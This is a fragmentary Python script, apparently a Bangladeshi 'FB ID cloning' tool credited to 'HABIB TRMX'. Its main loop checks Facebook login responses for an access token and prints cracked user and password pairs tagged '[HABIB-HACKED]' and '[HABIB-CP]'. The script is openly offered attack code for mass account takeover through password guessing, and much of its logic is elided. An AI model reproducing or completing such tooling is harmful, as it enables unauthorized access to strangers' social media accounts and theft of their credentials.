#Codder Excellent man Imran

#Edit & Modify With Credit
...
print("this tool is free by Rebooting Rables")

print

psb('\x1b[1;32mYOU ENTERING BD SUPER FAST FB ID CLONING TOOL PLEASE WAIT......THIS TOOL MAKE BY HABIB TRMX.......ANY ONE COPY THIS CODE! CREDIT ME ........Excellent man Habib......................................OPENING.............')
...
def menu():
    ...
    print'FB OLD ID CLONING [Excellent man Imran]'

    print 50* '-'

    print 'Codder.  : Excellent man HABIB'

    print 'AUTHOR   : TRMX HABIB'

    print 'FACOfficial : https://www.facebook.com/HABIB.TRMX'

    print 'GITHUB   : https://github.com/habibvip'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[HABIB-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[HABIB-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[(MAMUN)Open After 03 Days]\x1b[0m \n'
